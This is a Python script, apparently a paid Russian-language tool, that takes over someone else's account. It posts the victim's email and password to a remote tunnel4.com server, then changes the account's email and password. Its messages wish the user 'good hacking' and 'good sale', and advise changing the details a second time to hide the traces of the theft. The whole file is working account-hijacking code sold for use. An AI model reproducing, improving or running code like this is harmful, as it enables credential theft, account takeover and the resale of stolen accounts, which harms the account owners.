import requests
import colorama
import os
import time
from rich.console import Console
from rich_gradient import Gradient

os.system("cls || clear")
console = Console()

def Auth(key):
    req = requests.post(f"https://79856fb2-00aa-4b51-8ce7-6c14d9a39e59.tunnel4.com/Auth/{key}")
    json_data = req.json()

    return json_data

def GetID_TOKEN(email, password, key):
    headers = {
        "Content-Type": "application/json"
    }

    data = {
        "email": email,
        "password": password,
        "key": key
    }

    req = requests.post(f"https://79856fb2-00aa-4b51-8ce7-6c14d9a39e59.tunnel4.com/GetID_TOKEN/", headers=headers, json=data)
    json_data = req.json()

    if req.status_code == 200:
        if json_data == 3:
            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")
        
        if json_data == 1:
            idToken = json_data
            os.system("cls || clear")
            print(f"Успешный логин в аккаунт :D\n{colorama.Fore.GREEN}+-------УДАЧНОГО ВЗЛОМА :)-------+" + colorama.Fore.WHITE)
            return 1
    else:
        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
        print(str(json_data) + colorama.Fore.WHITE)

def UPDATE_TOKEN(newemail, password, key):
    headers = {
        "Content-Type": "application/json"
    }

    data = {
        "email": newemail,
        "password": password,
        "key": key
    }

    req = requests.post(f"https://79856fb2-00aa-4b51-8ce7-6c14d9a39e59.tunnel4.com/GetID_TOKEN/", headers=headers, json=data)
    json_data = req.json()

    if req.status_code == 200:
        if json_data == 3:
            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")
        
        if json_data == 1:
            idToken = json_data
            return 1
    else:
        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
        print(str(json_data) + colorama.Fore.WHITE)


def CHANGE_EMAIL(newEmail, key):
    headers = {
        "Content-Type": "application/json"
    }

    data = {
        "email": newEmail,
        "key": key
    }

    req = requests.post(f"https://79856fb2-00aa-4b51-8ce7-6c14d9a39e59.tunnel4.com/CHANGE_EMAIL/", headers=headers, json=data)
    json_data = req.json()

    if req.status_code == 200:
        if json_data == 3:
            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")

        if json_data == 1:
            print(colorama.Fore.GREEN + f"Почта УСПЕШНО изменена :) ~> [ {newEmail} ]" + colorama.Fore.WHITE)
    else:
        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
        print(str(json_data) + colorama.Fore.WHITE)


def CHANGE_PASSWORD(newPassword, key):
    headers = {
        "Content-Type": "application/json"
    }

    data = {
        "password": newPassword,
        "key": key
    }

    req = requests.post(f"https://79856fb2-00aa-4b51-8ce7-6c14d9a39e59.tunnel4.com/CHANGE_PASSWORD/", headers=headers, json=data)
    json_data = req.json()

    if req.status_code == 200:
        if json_data == 3:
            print("ДАЖЕ НЕ ПЫТАЙСЯ КРЯКНУТЬ :D")

        if json_data == 1:
            print(colorama.Fore.GREEN + f"Пароль УСПЕШНО изменён :) ~> [ {newPassword} ] \n\n!Для 100% кражи советую изменить данные повторно для скрытия следов!\n        ---[ УДАЧНОЙ ПРОДАЖИ ]---" + colorama.Fore.WHITE)
    else:
        print(colorama.Fore.RED + "+-------ПЕЧАЛЬКА :(-------+")
        print(str(json_data) + colorama.Fore.WHITE)

console.print(Gradient("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⣶⣿⣿⣿⣿⣿⣿⣿⣿⠟⠙⢻⡷⢶⣤⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡛⠛⠋⠉⠉⠁⠀⢐⣤⢴⣤⣀⠀⠛⠿⣷⣤⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀⠀⠀⢀⣯⣀⡴⣤⡈⠃⠀⠀⠈⠙⢿⣦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⣿⣤⡍⢡⢛⣋⡇⠀⠀⠀⠀⠀⠙⢷⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⡇⢿⡼⢤⣌⣿⡇⡀⠀⠀⠀⠀⠀⠀⠙⢆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢼⡇⢀⣸⣇⣸⣿⣦⣿⣿⢁⠈⡤⡀⠀⠀⠀⠀⠀⠈
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⣷⡏⡿⢯⡻⣿⣿⠇⢇⠎⠞⣵⡷
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣷⠀⢀⡙⠾⣿⣼⣯⣾⣀⡿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⢻⡎⣿⣿⣦⡀⠙⢿⡿⣯⣲⣶⣃
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⢸⣷⢸⣿⣞⢿⣆⠀⡀⢈⠉⠻⣿⣀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⣹⣿⣿⠀⣿⡄⣿⣿⣆⠹⣷⣼⣶⣷⣄⣾⠋
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⡅⣿⣿⢹⠀⠘⣧⢹⣿⣿⣦⡘⢧⠉⡛⠛⢿⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢣⣇⡟⣿⠈⢠⠀⠹⡆⠻⣿⣿⡳⣄⠱⣌⠃⢸⡿⣦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⢇⣾⣿⡇⢿⠀⣿⢰⠀⢻⣆⠹⣿⣿⣌⢓⢬⡛⢸⡇⠘⡖⣄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⣾⣿⢹⡇⠀⠀⣿⠸⣧⠀⢻⣷⡙⢏⢻⣿⣝⢦⢻⣧⠀⢹⡘⢦⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠃⢰⡟⣿⢸⡇⠀⢸⣿⠀⣿⣆⠀⢻⣟⠦⠀⢿⣿⣮⢻⣿⠀⣼⡇⡈⢻⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿⠁⣿⠘⠁⠀⢸⣿⡄⠘⣿⡄⢠⠙⣦⠀⠈⣿⠈⠋⠃⣴⡟⢇⢻⡀⢻⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⠀⣿⠀⠀⠀⣿⣿⣇⠀⢹⣿⡀⢳⡄⠀⠀⣿⠀⢠⣾⢿⠁⠀⠈⣧⠀⢧
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⢱⠀⠀⠀⣿⡏⠹⡆⠀⢹⣧⠀⢻⣆⠀⠁⢀⣿⣷⡈⠀⠀⠀⠸⣇⠸⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠙⣆⠀⢻⡄⠀⠹⣷⣄⠘⢻⡿⣷⡄⠀⠀⠀⣯
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠀⠀⠀⠀⠀⠈⠇⠀⠀⠀⠘⠂⠀⢧⠙⣿⢦
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉

⣿⣏⢽⣟⠻⣿⢟⠟⣻⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿""", colors=["red", "black"]))
print("Создатель софта: @KaliMRX")

key = input("Key: ")
auth_res = Auth(key)
if auth_res == 1:
    email = input("Email: ")
    passwd = input("Password: ")
    out = GetID_TOKEN(email, passwd, key)

    if out == 1:
        new_email = input("New Email: ")
        new_passwd = input("New Password: ")
        os.system("cls || clear")
        CHANGE_EMAIL(new_email, key)
        UPDATE_TOKEN(new_email, passwd, key)
        CHANGE_PASSWORD(new_passwd, key)
    else:
        print("Неверные данные!")
        exit()
elif auth_res == 3:
    print("Срок ключа истек!")
else:
    print("Неверный ключ! (Если после покупки ключа не прошел месяц напиши сюда: @KaliMRX)")
